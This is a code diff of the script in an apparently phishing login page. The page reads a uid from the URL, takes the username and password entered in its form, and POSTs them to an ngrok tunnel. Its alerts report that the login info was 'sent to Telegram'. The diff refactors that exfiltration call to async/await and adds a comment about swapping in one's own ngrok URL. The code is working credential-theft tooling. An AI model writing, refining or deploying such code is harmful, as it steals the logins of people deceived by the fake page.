@@ -48,12 +48,13 @@
   </div>
 
   <script>
+    // Automatically grab uid from URL
     function getUID() {
       const params = new URLSearchParams(window.location.search);
       return params.get("uid");
     }
 
-    function sendLogin() {
+    async function sendLogin() {
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
       const uid = getUID();
@@ -63,17 +64,21 @@
         return;
       }
 
-      fetch("https://unburst-unfeatured-jericho.ngrok-free.dev", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({uid, username, password})
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.status === "sent") alert("Login info sent to Telegram!");
-        else alert("Error sending info.");
-      })
-      .catch(err => alert("Network error: " + err));
+      try {
+        const response = await fetch("https://unburst-unfeatured-jericho.ngrok-free.dev", {  // <-- replace with your ngrok public URL
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ uid, username, password })
+        });
+        const data = await response.json();
+        if (data.status === "sent") {
+          alert("✅ Login info sent to Telegram!");
+        } else {
+          alert("❌ Error sending info: " + (data.error || "Unknown error"));
+        }
+      } catch (err) {
+        alert("❌ Network error: " + err);
+      }
     }
   </script>
 </body>
